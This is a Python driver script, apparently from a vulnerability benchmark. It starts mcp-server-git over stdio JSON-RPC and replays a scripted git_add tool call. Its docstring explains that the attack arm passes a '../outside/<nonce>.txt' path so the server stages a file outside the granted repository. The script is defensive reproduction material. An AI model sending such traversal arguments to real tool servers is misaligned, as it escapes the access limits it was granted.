"""Scripted MCP host: launches mcp-server-git over stdio with /srv/repo as the only granted
repository, then sends the git_add tool call the (scripted) model chose: inputs/<arm>.json.

Before the call the driver materialises every path in `files` (resolved relative to the repo
working dir /srv/repo, exactly as git would), so the victim file exists on disk. The attack
lists `../outside/<nonce>.txt`, a file *outside* the granted repo; the vulnerable git_add runs
`repo.index.add(files)`, which stages it with no confinement check. The driver speaks
newline-delimited JSON-RPC, the MCP stdio framing the SDK uses.
"""
import json
import os
import subprocess
import sys

REPO = "/srv/repo"
arm, nonce = sys.argv[1], sys.argv[2]
call = json.loads(open(f"/case/inputs/{arm}.json", encoding="utf-8").read().replace("{{NONCE}}", nonce))

# Materialise each requested file at its on-disk location (paths are relative to the repo tree).
for f in call["arguments"]["files"]:
    p = os.path.normpath(os.path.join(REPO, f))
    os.makedirs(os.path.dirname(p), exist_ok=True)
    with open(p, "w", encoding="utf-8") as fh:
        fh.write(f"victim-{nonce}\n")

srv = subprocess.Popen(
    ["python", "-m", "mcp_server_git", "--repository", REPO],
    stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=sys.stderr, text=True, bufsize=1,
)


def send(obj):
    srv.stdin.write(json.dumps(obj) + "\n")
    srv.stdin.flush()


def recv(want_id):
    while True:
        line = srv.stdout.readline()
        if not line:
            raise SystemExit("server closed stdout")
        line = line.strip()
        if not line:
            continue
        msg = json.loads(line)
        if msg.get("id") == want_id:
            return msg


try:
    send({"jsonrpc": "2.0", "id": 1, "method": "initialize",
          "params": {"protocolVersion": "2024-11-05", "capabilities": {},
                     "clientInfo": {"name": "avb-driver", "version": "0"}}})
    recv(1)
    send({"jsonrpc": "2.0", "method": "notifications/initialized"})
    send({"jsonrpc": "2.0", "id": 2, "method": "tools/call", "params": call})
    resp = recv(2)
    print(json.dumps(resp)[:300])
finally:
    srv.terminate()
    try:
        srv.wait(timeout=10)
    except Exception:
        srv.kill()
